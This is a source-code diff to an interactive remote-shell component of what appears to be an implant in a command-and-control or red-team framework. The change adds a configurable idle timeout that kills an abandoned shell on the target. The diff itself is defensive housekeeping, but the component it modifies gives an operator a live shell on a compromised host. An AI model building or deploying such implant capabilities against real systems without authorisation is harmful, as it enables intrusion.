@@ -30,6 +30,14 @@ namespace Rod.Implant.Internal;
 /// output upstream as chunks, operator input downstream into the shell. The
 /// optional arguments string is an initial command, shell.exec's grammar
 /// carried over, run once before the channel holds the session open.
+///
+/// A shell left alone closes itself: when no operator input arrives for the
+/// idle window (default 10 minutes, overridable with the
+/// ROD_SHELL_IDLE_SECONDS environment variable for lab runs), the shell is
+/// killed and the task completes -- an abandoned channel must not hold a live
+/// shell open on the target indefinitely. The window counts input, not
+/// output, so a long-running command the operator is watching keeps its
+/// shell; only a channel nobody types into dies.
 /// </summary>
 internal static class InteractiveShell
 {
@@ -37,6 +45,19 @@ internal static class InteractiveShell
     // the largest ChannelOutput frame the channel emits -- well inside the
     // frame-layer sizing budget with protobuf overhead to spare.
     private const int OutputChunkBytes = 16 * 1024;
+
+    // The self-close window: generous on purpose (see the class summary) --
+    // an operator watching a long printout types nothing for minutes at a
+    // time, and their session must survive it.
+    private static readonly TimeSpan DefaultIdleClose = TimeSpan.FromMinutes(10);
+
+    private static TimeSpan IdleClose()
+    {
+        var raw = Environment.GetEnvironmentVariable("ROD_SHELL_IDLE_SECONDS");
+        return int.TryParse(raw, out var seconds) && seconds > 0
+            ? TimeSpan.FromSeconds(seconds)
+            : DefaultIdleClose;
+    }
 
     /// <summary>
     /// Runs the interactive shell on <paramref name="stream"/> until the shell
@@ -108,6 +129,19 @@ internal static class InteractiveShell
                 catch { /* already gone */ }
             }, process);
 
+            // The self-close window: armed at start and re-armed on every
+            // operator input, so the timer measures silence, not session age.
+            // When it fires the process tree is killed (the registered
+            // callback below) and the wait observes the life token ending.
+            var idleClose = IdleClose();
+            using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+            idle.CancelAfter(idleClose);
+            idle.Token.Register(static state =>
+            {
+                try { ((Process)state!).Kill(entireProcessTree: true); }
+                catch { /* already gone */ }
+            }, process);
+
             // Everything rides the raw stdin stream -- mixing the text writer's
             // buffering with raw byte writes would reorder the input.
             var stdin = process.StandardInput.BaseStream;
@@ -127,12 +161,19 @@ internal static class InteractiveShell
             {
                 PumpOutputAsync(process.StandardOutput.BaseStream, stream, cancellationToken),
                 PumpOutputAsync(process.StandardError.BaseStream, stream, cancellationToken),
-                PumpInputAsync(stdin, stream, shellGone.Token),
+                PumpInputAsync(stdin, stream, shellGone.Token, idle),
             };
 
             try
             {
-                await process.WaitForExitAsync(cancellationToken);
+                await process.WaitForExitAsync(idle.Token);
+            }
+            catch (OperationCanceledException) when (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
+            {
+                // The idle window closed the shell: an honest completion, not
+                // a failure -- the transcript (already streamed) is the
+                // session's record.
+                return (TaskOutcome.Succeeded, $"shell closed after {idleClose.TotalMinutes:0.#} minutes without input");
             }
             finally
             {
@@ -144,6 +185,12 @@ internal static class InteractiveShell
                 catch (IOException) { }
                 try { stdin.Close(); } catch { /* already closed */ }
             }
+
+            // The idle kill usually ends the wait through the token (above),
+            // but the process's own death can win the race -- the exit is the
+            // same self-close either way, so the message must be too.
+            if (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
+                return (TaskOutcome.Succeeded, $"shell closed after {idleClose.TotalMinutes:0.#} minutes without input");
 
             return process.ExitCode == 0
                 ? (TaskOutcome.Succeeded, "shell exited")
@@ -179,10 +226,13 @@ internal static class InteractiveShell
 
     // The input pipe: operator input into the shell's stdin. Eof closes stdin
     // -- the shell reads its own EOF and exits, ending the channel naturally.
+    // Every received input re-arms the idle window, so an active session never
+    // self-closes no matter how long it runs.
     private static async Task PumpInputAsync(
         Stream stdin,
         IChannelStream stream,
-        CancellationToken cancellationToken)
+        CancellationToken cancellationToken,
+        CancellationTokenSource idle)
     {
         while (true)
         {
@@ -200,6 +250,10 @@ internal static class InteractiveShell
             {
                 return; // The channel host completed the input; nothing more comes.
             }
+
+            // Operator activity: push the self-close window out again.
+            if (data is { Length: > 0 } || eof)
+                idle.CancelAfter(IdleClose());
 
             if (data is { Length: > 0 })
             {
